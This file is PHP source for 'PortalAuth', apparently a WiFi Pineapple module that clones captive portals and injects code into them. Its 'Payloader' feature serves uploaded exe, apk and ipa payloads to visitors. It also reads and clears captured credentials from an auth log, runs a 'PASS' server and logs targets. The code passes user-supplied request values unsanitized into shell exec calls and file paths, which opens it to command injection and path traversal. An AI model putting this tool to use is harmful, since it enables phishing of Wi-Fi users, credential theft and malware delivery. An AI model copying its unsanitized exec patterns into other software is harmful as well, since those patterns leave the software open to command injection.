<?php

namespace pineapple;

define('__INCLUDES__', "/pineapple/modules/PortalAuth/includes/");
define('__CONFIG__', __INCLUDES__ . "config");
define('__AUTHLOG__', "/www/auth.log");

// Main directory defines
define('__LOGS__', __INCLUDES__ . "logs/");
define('__HELPFILES__', __INCLUDES__ . "help/");
define('__CHANGELOGS__', __INCLUDES__ . "changelog/");
define('__SCRIPTS__', __INCLUDES__ . "scripts/");

// Injection set defines
define('__INJECTS__', __SCRIPTS__ . "injects/");
define('__SKELETON__', __SCRIPTS__. "skeleton/");

// NetClient defines
define('__DOWNLOAD__', "/www/download/");
define('__WINDL__', __DOWNLOAD__ . "windows/");
define('__OSXDL__', __DOWNLOAD__ . "osx/");
define('__ANDROIDDL__', __DOWNLOAD__ . "android/");
define('__IOSDL__', __DOWNLOAD__ . "ios/");

// PASS defines
define('__PASSDIR__', __INCLUDES__ . "pass/");
define('__KEYDIR__', __PASSDIR__ . "keys/");
define('__PASSSRV__', __PASSDIR__ . "pass.py");
define('__PASSBAK__', __PASSDIR__ . "Backups/pass.py");
define('__PASSLOG__', __PASSDIR__ . "pass.log");
define('__TARGETLOG__', __PASSDIR__ . "targets.log");
define('__CSAPI__', __PASSDIR__ . "NetCli_CS.zip");
define('__COMPILEWIN__', __PASSDIR__ . "NetCli_Win.zip");
define('__COMPILEOSX__', __PASSDIR__ . "NetCli_OSX.zip");


/*
	Determine the type of file that has been uploaded and move it to the appropriate
	directory.  If it's a .zip it is an injection set and will be unpacked.  If it is
	an .exe it will be moved to __WINDL__, etc.
*/
if (!empty($_FILES)) {
	$response = [];
	foreach ($_FILES as $file) {
		$tempPath = $file[ 'tmp_name' ];
		$name = pathinfo($file['name'], PATHINFO_FILENAME);
		$type = pathinfo($file['name'], PATHINFO_EXTENSION);
		
		switch ($type) {
			case 'exe':
				$dest = __WINDL__;
				break;
			case 'bat':
				$dest = __WINDL__;
				break;
			case 'zip':
				$dest = __OSXDL__;
				break;
			case 'apk':
				$dest = __ANDROIDDL__;
				break;
			case 'ipa':
				$dest = __IOSDL__;
				break;
			case 'gz':
				$dest = __INJECTS__;
				break;
			default:
				$response[$name]['success'] = "Failed";
				$response[$name]['message'] = "File type '" . $type . "' is not supported";
				continue 2;
		}
		
		// Ensure the upload directory exists
		if (!file_exists($dest)) {
			if (!mkdir($dest, 0755, true)) {
				PortalAuth::logError("Failed Upload", "Failed to upload " . $name . "." . $type . " because the directory structure could not be created");
			}
		}
		
		$uploadPath = $dest . $name . "." . $type;
		$res = move_uploaded_file( $tempPath, $uploadPath );
		
		if ($res) {
			if ($type == "gz") {
				exec(__SCRIPTS__ . "unpackInjectionSet.sh " . $name . "." . $type);
			}
			$response[$name]['success'] = "Success";
		} else {
			$response[$name]['success'] = "Failed";
			$response[$name]['message'] = "Failed to upload " . $name . "." . $type;
		}
	}
	echo json_encode($response);
	die();
}


class PortalAuth extends Module
{
	public function route() {
		switch($this->request->action) {
			case 'init':
				$this->init();
				break;
			case 'depends':
				$this->depends($this->request->params);
				break;
			case 'getConfigs':
				$this->getConfigs();
				break;
			case 'updateConfigs':
				$this->saveConfigData($this->request->params);
				break;
			case 'checkTestServerConfig':
				$this->tserverConfigured();
				break;
			case 'readLog':
				$this->retrieveLog($this->request->file, $this->request->type);
				break;
			case 'deleteLog':
				$this->deleteLog($this->request->file);
				break;
			case 'isOnline':
				$this->checkIsOnline();
				break;
			case 'checkPortalExists':
				$this->portalExists();
				break;
			case 'getLogs':
				$this->getLogs($this->request->type);
				break;
			case 'getInjectionSets':
				$this->getInjectionSets();
				break;
			case 'clonedPortalExists':
				$this->clonedPortalExists($this->request->name);
				break;
			case 'clonePortal':
				$this->clonePortal($this->request->name, $this->request->options, $this->request->inject, $this->request->payloads);
				break;
			case 'checkPASSRunning':
				$this->getPID();
				break;
			case 'startServer':
				$this->startServer();
				break;
			case 'stopServer':
				$this->stopServer();
				break;
			case 'getCode':
				$this->loadPASSCode();
				break;
			case 'restoreCode':
				switch($this->request->file) {
					case 'pass':
						$this->restoreFile(__PASSSRV__, __PASSBAK__);
						break;
					default:
						$base = __INJECTS__ . $this->request->set . "/";
						$ext = ($this->request->file == "MyPortal") ? ".php" : ".txt";
						$path = $base . $this->request->file . $ext;
						$pathBak = $base . "backups/" . $this->request->file . $ext;
						$this->restoreFile($path, $pathBak);
						break;
				}
				break;
			case 'saveCode':
				switch($this->request->file) {
					case 'pass':
						$this->saveClonerFile(__PASSSRV__, $this->request->data);
						break;
					default:
						$base = __INJECTS__ . $this->request->set . "/";
						$ext = ($this->request->file == "MyPortal") ? ".php" : ".txt";
						$path = $base . $this->request->file . $ext;
						$this->saveClonerFile($path, $this->request->data);
						break;
				}
				break;
			case 'backupCode':
				switch($this->request->file) {
					case 'pass':
						$this->saveClonerFile(__PASSSRV__, $this->request->data);
						$this->backupFile(__PASSSRV__, __PASSBAK__);
						break;
					default:
						$base = __INJECTS__ . $this->request->set . "/";
						$ext = ($this->request->file == "MyPortal") ? ".php" : ".txt";
						$path = $base . $this->request->file . $ext;
						$pathBak = $base . "backups/" . $this->request->file . $ext;
						$this->saveClonerFile($path, $this->request->data);
						$this->backupFile($path, $pathBak);
						break;
				}
				break;
			case 'clearLog':
				$this->clearLog($this->request->file);
				break;
			case 'download':
				$this->download($this->request->file);
				break;
			case 'getInjectCode':
				$this->getInjectCode($this->request->injectSet);
				break;
			case 'downloadInjectSet':
				$this->exportInjectionSet($this->request->set);
				break;
			case 'deleteInjectSet':
				$this->deleteInjectionSet($this->request->set);
				break;
			case 'createInjectionSet':
				$this->createInjectionSet($this->request->name);
				break;
			case 'getCapturedCreds':
				$this->getCapturedCreds();
				break;
			case 'clearCapturedCreds':
				$this->clearCapturedCreds();
				break;
			case 'getPayloads':
				$this->getPayloads();
				break;
			case 'deletePayload':
				$this->deletePayload($this->request->filePath);
				break;
			case 'cfgUploadLimit':
				$this->cfgUploadLimit();
				break;
			case 'clearDownloads':
				$this->clearDownloads();
				break;
		}
	}
	
	/* ============================ */
	/*        INIT FUNCTIONS        */
	/* ============================ */
	
	private function init() {
		if (!file_exists(__LOGS__)) {
			if (!mkdir(__LOGS__, 0755, true)) {
				$this->respond(false, "Failed to create logs directory at " . __LOGS__);
				return false;
			}
		}
		if (!file_exists(__KEYDIR__)) {
			if (!mkdir(__KEYDIR__, 0755, true)) {
				$this->logError("Failed init", "Failed to initialize because the keys directory at '" . __KEYDIR__ . "' could not be created.");
				$this->respond(false);
				return false;
			}
		}
	}
	
	//============================//
	//    DEPENDENCY FUNCTIONS    //
	//============================//
	
	private function tserverConfigured() {
		$configs = $this->loadConfigData();
		if (empty($configs['testSite']) || empty($configs['dataExpected'])) {
			$this->respond(false);
			return;
		}
		$this->respond(true);
	}
	
	private function getConfigs() {
			$configs = $this->loadConfigData();
			$this->respond(true, null, $configs);
	}
	
	private function depends($action) {
		$retData = array();
		exec(__SCRIPTS__ . "depends.sh " . $action, $retData);
		switch (implode(" ", $retData)) {
			case 'Installed':
				$this->respond(true);
				break;
			case 'Complete':
				$this->respond(true);
				break;
			default:
				$this->respond(false);
		}
	}
	
	//======================//
	//    MISC FUNCTIONS    //
	//======================//
	
	private function checkIsOnline() {
		$connected = @fsockopen("www.wifipineapple.com", 443);
		if ($connected) {
			fclose($connected);
			$this->respond(true);
			return true;
		}
		$this->respond(false);
	}
	private function getCapturedCreds() {
		if (file_exists(__AUTHLOG__)) {
			$this->respond(true, null, file_get_contents(__AUTHLOG__));
			return;
		}
		$this->respond(false);
	}
	
	private function clearCapturedCreds() {
		$res = true;
		if (file_exists(__AUTHLOG__)) {
			$fh = fopen(__AUTHLOG__, "w");
			$res = ($fh) ? true : false;
			fclose($fh);
		}
		$this->respond($res);
		return $res;
	}

	private function respond($success, $msg = null, $data = null) {
		$this->response = array("success" => $success,"message" => $msg, "data" => $data);
	}
	
	//========================//
	//    PORTAL FUNCTIONS    //
	//========================//
	
	private function portalExists() {
		$configs = $this->loadConfigData();
		$pageData = [];
		exec("curl " . $configs['testSite'], $pageData);
		if (strcmp($pageData[0], $configs['dataExpected']) == 0) {
			$this->respond(false);
		} else {
			$this->respond(true);
		}
	}
	
	private function clonePortal($name, $opts, $injectionSet, $payloads) {
		
		$configs = $this->loadConfigData();
		if ($this->clonedPortalExists($name)) {
			// Delete the current portal
			$this->rrmdir($configs['p_archive'] . $name);
		}
		
		// If injectSet is Payloader we need to clone the set
		// modify the contents to match the supplied payloads
		// and pass in the clone as --injectSet

		$clonedSet = false;
		if ($injectionSet == "Payloader") {
			
			// Make a copy of the Payloader injection set
			$clonedSet = $this->cloneInjectionSet("Payloader");
			if (!$clonedSet) {
				$this->respond(false);
				return;
			}
			
			// Add the payload paths to the cloned injection set
			$injectphp = file_get_contents(__INJECTS__ . $clonedSet . "/injectPHP.txt");
			
			$payloadArr = json_decode($payloads);
			foreach ($payloadArr as $payloadType => $payloadName) {
				if ($payloadType == "windows") {
					$injectphp = str_replace("<EXE>", $payloadName, $injectphp);
				} else if ($payloadType == "osx") {
					$injectphp = str_replace("<APP>", $payloadName, $injectphp);
				} else if ($payloadType == "android") {
					$injectphp = str_replace("<APK>", $payloadName, $injectphp);
				} else if ($payloadType == "ios") {
					$injectphp = str_replace("<IPA>", $payloadName, $injectphp);
				}
			}
			
			// Overwrite InjectPHP in the cloned set
			file_put_contents(__INJECTS__ . $clonedSet . "/injectPHP.txt", $injectphp);
			
			// Use the cloned set instead of the Payloader template
			$injectionSet = $clonedSet;
			
		}
		
		// Build a params dictionary
		$params = array();
		$params['--portalName'] = $name;
		$params['--portalArchive'] = $configs['p_archive'];
		$params['--url'] = $configs['testSite'];
		$params['--injectSet'] = $injectionSet;
		
		// Options come in the form of a semi-colon delimited string
		// i.e. stripjs;injectcss;injectjs
		// This block simply sets them as a new key in params with a null
		// value since they are command line switches
		if (strlen($opts) > 0) {
			foreach (explode(";", $opts) as $opt) {
				$key = "--" . $opt;
				$params[$key] = null;
			}
		}
		
		// Build the argument string
		$argString = "";
		foreach ($params as $k => $v) {
			if ($v == null) {
				$argString .= " $k";
			} else {
				$argString .= " $k $v";
			}
		}
		
		/*
		$this->respond(false, "python portalclone.py $argString");
		return;
		*/
		
		$data = array();
		$res = exec("python " . __SCRIPTS__ . "portalclone.py" . $argString ." 2>&1", $data);
		
		// If Payloader was used then delete the cloned directory
		if ($clonedSet) {
			if (!$this->deleteInjectionSet($clonedSet)) {
				$this->logError("Payloader_Cleanup", "Failed to remove clone of Payloader at " . __INJECTS__ . $clonedSet);
			}
		}
		
		// Check if the clone was successful
		if ($res == "Complete") {
			$this->respond(true);
			return;
		}
		$this->logError("clone_error", implode("\r\n",$data));
		$this->respond(false);
	}
	
	private function clonedPortalExists($name) {
		$configs = $this->loadConfigData();
		if (file_exists($configs['p_archive'] . $name)) {
			$this->respond(true);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	//======================//
	//    PASS FUNCTIONS    //
	//======================//
	
	private function startServer() {
		$ret = exec("python " . __PASSSRV__ . " > /dev/null 2>&1 &");
		if ($this->getPID() != false) {
			$dt = array();
			exec("date +'%m/%d/%Y %T'", $dt);
			$fh = fopen(__PASSLOG__, "a");
			fwrite($fh, "[!] " . $dt[0] . " - Starting server...\r\n");
			fclose($fh);
			$this->respond(true);
			return true;
		}
		$this->logError("PASS_Server", "Failed to start server.");
		$this->respond(false);
		return false;
	}
	
	private function stopServer() {
		$pid = $this->getPID();
		if ($pid != false) {
			$ret = exec("kill " . $pid);
			if ($this->getPID() != false) {
				$this->logError("PASS_Server", "Failed to stop PASS server.  PID = " . $pid);
				$this->respond(false);
				return false;
			}
		}
		$dt = array();
		exec("date +'%m/%d/%Y %T'", $dt);
		$fh = fopen(__PASSLOG__, "a");
		fwrite($fh, "[!] " . $dt[0] . " - Server stopped\r\n");
		fclose($fh);
		$this->respond(true);
		return true;
	}
	
	private function getPID() {
		$data = array();
		$ret = exec("pgrep -lf pass.py", $data);
		$output = explode(" ", $data[0]);
		if ($output[1] == "python") {
			$this->respond(true, null, $output[0]);
			return $output[0];
		}
		$this->respond(false);
		return false;
	}
	
	private function loadPASSCode() {
		$data = file_get_contents(__PASSSRV__);
		if (!$data) {
			$this->respond(false);
			return false;
		}
		$this->respond(true, null, $data);
		return $data;
	}
	
	//===========================//
	//    FILE SAVE FUNCTIONS    //
	//===========================//
	
	private function saveClonerFile($filename, $data) {
		$fh = fopen($filename, "w+");
		if ($fh) {
			fwrite($fh, $data);
			fclose($fh);
			$this->respond(true);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function saveConfigData($data) {
		$fh = fopen(__CONFIG__, "w+");
		if ($fh) {
			foreach ($data as $key => $value) {
				fwrite($fh, $key . "=" . $value . "\n");
			}
			fclose($fh);
			$this->respond(true);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	private function loadConfigData() {
		$configs = array();
		$config_file = fopen(__CONFIG__, "r");
		if ($config_file) {
			while (($line = fgets($config_file)) !== false) {
				$item = explode("=", $line, 2);
				$key = $item[0]; $val = trim($item[1]);
				$configs[$key] = $val;
			}
		}
		fclose($config_file);
		return $configs;
	}
	
	private function backupFile($fileName, $backupFile) {
		// Attempt to create a backups directory in case it doesn't exist
		mkdir(dirname($backupFile));
		if (copy($fileName, $backupFile)) {
			$this->respond(true);
			return true;
		}
		$this->respond(false);
		return false;
	}
	
	//==================================//
	//    FILE RESTORATION FUNCTIONS    //
	//==================================//
	
	private function restoreFile($oldFile, $newFile) {
		$fileData = file_get_contents($newFile);
		if ($fileData) {
			$this->saveClonerFile($oldFile, $fileData);
			$this->respond(true, null, $fileData);
			return $fileData;
		}
		$this->respond(false);
		return false;
	}
	
	//===============================//
	//    INJECTION SET FUNCTIONS    //
	//===============================//
	
	private function createInjectionSet($setName) {
		// Check if the directory exists
		if (file_exists(__INJECTS__ . $setName)) {
			$this->logError("New_Injection_Set", "Failed to create new injection set because the name provided is already in use.");
			$this->respond(false);
			return false;
		}
	
		// Create a directory for the set
		if (!mkdir(__INJECTS__ . $setName)) {
			$this->logError("New_Injection_Set", "Failed to create directory structure");
			$this->respond(false);
			return false;
		}
		// Create each of the Inject files
		foreach (scandir(__SKELETON__) as $file) {
			if ($file == "." || $file == "..") {continue;}
			if (!copy(__SKELETON__ . $file, __INJECTS__ . $setName . "/" . $file)) {
				$this->logError("Injection_Set_Creation_Error", "Failed to create the following file: " . $file);
			}
		}
		
		$this->respond(true);
		return true;
	}
	
	private function cloneInjectionSet($set) {
		
		// Create a random name for the cloned directory
		do {
			$newDir = $set . "-" . substr(md5(rand()), 0, 5);
		} while (file_exists(__INJECTS__ . $newDir));
		
		// Create the new directory
		if (!mkdir(__INJECTS__ .$newDir)) {
			$this->logError("Injection_Set_Clone_Error", "Failed to create root directory");
			$this->respond(false);
			return false;
		}
		
		// Copy the files from the original to the new
		$sourceDir = __INJECTS__ . $set . "/";
		$destDir = __INJECTS__ . $newDir . "/";
		foreach (scandir($sourceDir) as $file) {
			if ($file == "." || $file == ".." || $file == "backups") {continue;}
			if (!copy($sourceDir . $file, $destDir . $file)) {
				$this->logError("Injection_Set_Clone_Error", "Failed to create the following file: " . $file);
				return false;
			}
			
			// Change the permissions on the copied file
			chmod($destDir . $file, 0755);
		}
		
		// This returns the name of the directory that was cloned
		return $newDir;
	}
	
	private function exportInjectionSet($setName) {
		
		if (!file_exists(__INCLUDES__ . "downloads")) {
			mkdir(__INCLUDES__ . "downloads");
		}
		
		$data = array();
		$res = exec(__SCRIPTS__ . "packInjectionSet.sh " . $setName, $data);
		if ($res != "Complete") {
			$this->logError("Injection_Set_Export", $data);
			$this->respond(false);
			return false;
		}
		$file = __INCLUDES__ . "downloads/" . $setName . ".tar.gz";
		$this->respond(true, null, $this->downloadFile($file));
		return true;
	}
	
	private function getInjectionSets() {
		$dirs = scandir(__INJECTS__);
		array_shift($dirs); array_shift($dirs);
		array_unshift($dirs, "Select...");
		$this->respond(true, null, $dirs);
	}
	
	private function getInjectCode($set) {
		$failed = false;
		$injectFiles = array();
		if (!$injectFiles['injectjs'] = $this->getInjectionFile("injectJS.txt", $set)){
			$failed = true;
		}
		if (!$injectFiles['injectcss'] = $this->getInjectionFile("injectCSS.txt", $set)) {
			$failed = true;
		}
		if (!$injectFiles['injecthtml'] = $this->getInjectionFile("injectHTML.txt", $set)) {
			$failed = true;
		}
		if (!$injectFiles['MyPortal'] = $this->getInjectionFile("MyPortal.php", $set)) {
			$failed = true;
		}
		if (!$injectFiles['injectphp'] = $this->getInjectionFile("injectPHP.txt", $set)) {
			$failed = true;
		}
		if ($failed) {
			$this->logError("Retrieve_Injection_Set", "Failed to retrieve all files from the selected injection set.");
		}
		$this->respond(true, null, $injectFiles);
		return true;
	}
	
	private function getInjectionFile($fileName, $setName) {
		if (file_exists(__INJECTS__ . $setName . "/" . $fileName)) {
			return file_get_contents(__INJECTS__ . $setName . "/" . $fileName);
		}
		return false;
	}
	
	private function deleteInjectionSet($setName) {
		$this->rrmdir(__INJECTS__ . $setName);
		if (is_dir(__INJECTS__ . $setName)) {
			$this->respond(false);
			return false;
		}
		$this->respond(true);
		return true;
	}
	
	//=========================//
	//    PAYLOAD FUNCTIONS    //
	//=========================//
	
	private function getPayloads() {
		$files = [];
		
		foreach ([__WINDL__, __OSXDL__, __ANDROIDDL__, __IOSDL__] as $dir) {
			foreach (scandir($dir) as $file) {
				if ($file == "." || $file == "..") {continue;}
				$files[$file] = $dir;
			}
		}
		$this->respond(true, null, $files);
		return $files;
	}
	
	private function deletePayload($filePath) {
		if (!unlink($filePath)) {
			$this->logError("Delete Payload", "Failed to delete payload at path " . $filePath);
			$this->respond(false);
			return false;
		}
		$this->respond(true);
		return true;
	}
	
	private function cfgUploadLimit() {
		$data = array();
		$res = exec("python " . __SCRIPTS__ . "cfgUploadLimit.py > /dev/null 2>&1 &", $data);
		if ($res != "") {
			$this->logError("cfg_upload_limit_error", $data);
			$this->respond(false);
			return false;
		}
		$this->respond(true);
		return true;
	}

	//=========================================//
	//    ACTIVITY AND TARGET LOG FUNCTIONS    //
	//=========================================//
	
	private function clearLog($log) {
		if ($log == "activity") {
			$fh = fopen(__PASSLOG__, "w+");
			fclose($fh);
			$this->respond(true, null, file_get_contents(__PASSLOG__));
			return file_get_contents(__PASSLOG__);
		} else if ($log == "targets") {
			$fh = fopen(__TARGETLOG__, "w+");
			fclose($fh);
			$this->respond(true, null, file_get_contents(__TARGETLOG__));
			return file_get_contents(__TARGETLOG__);
		}
	}
	
	private function download($file) {
		if ($file == "activity") {
			$this->respond(true, null, $this->downloadFile(__PASSLOG__));
		} else if ($file == "targets") {
			$this->respond(true, null, $this->downloadFile(__TARGETLOG__));
		} else if ($file == "networkclient_windows") {
			$this->respond(true, null, $this->downloadFile(__COMPILEWIN__));
		} else if ($file == "networkclient_osx") {
			$this->respond(true, null, $this->downloadFile(__COMPILEOSX__));
		} else if ($file == "networkclient_cs_api") {
			$this->respond(true, null, $this->downloadFile(__CSAPI__));
		}
	}
	
	private function clearDownloads() {
		$files = scandir(__INCLUDES__ . "downloads/");
		foreach ($files as $file) {
			if ($file == "." || $file == "..") {continue;}
			if (!unlink(__INCLUDES__ . "downloads/" . $file)) {
				$this->logError("Delete", "Failed to delete file " . __INCLUDES__ . "downloads/" . $file);
			}
		}
		$this->respond(true);
		return true;
	}
	
	//===========================//
	//    ERROR LOG FUNCTIONS    //
	//===========================//

	public static function logError($filename, $data) {
		$time = exec("date +'%H_%M_%S'");
		$fh = fopen(__LOGS__ . $filename . "_" . $time . ".txt", "w+");
		fwrite($fh, $data);
		fclose($fh);
	}

	private function getLogs($type) {
		$dir = ($type == "error") ? __LOGS__ : __CHANGELOGS__;
		$contents = array();
		foreach (scandir($dir) as $log) {
			if ($log == "." || $log == "..") {continue;}
			array_push($contents, $log);
		}
		$this->respond(true, null, $contents);
	}

	private function retrieveLog($logname, $type) {
        switch($type) {
                case "error":
                    $dir = __LOGS__;
                    break;
                case "help":
                    $dir = __HELPFILES__;
                    break;
                case "change":
                    $dir = __CHANGELOGS__;
                    break;
                case "pass":
                    $dir = __PASSDIR__;
                    break;
        }
		$data = file_get_contents($dir . $logname);
		if (!$data) {
			$this->respond(false);
			return;
		}
		$this->respond(true, null, $data);
	}

	private function deleteLog($logname) {
		$res = unlink(__LOGS__ . $logname);
		$this->respond($res);
		return $res;
	}

	private function rrmdir($dir) {
		if (is_dir($dir)) {
			$objects = scandir($dir);
			foreach ($objects as $object) {
				if ($object != "." && $object != "..") {
					if (filetype($dir."/".$object) == "dir") {
						$this->rrmdir($dir."/".$object);
					} else {
						unlink($dir."/".$object);
					}
				}
			}
			reset($objects);
			rmdir($dir);
		}
	}
}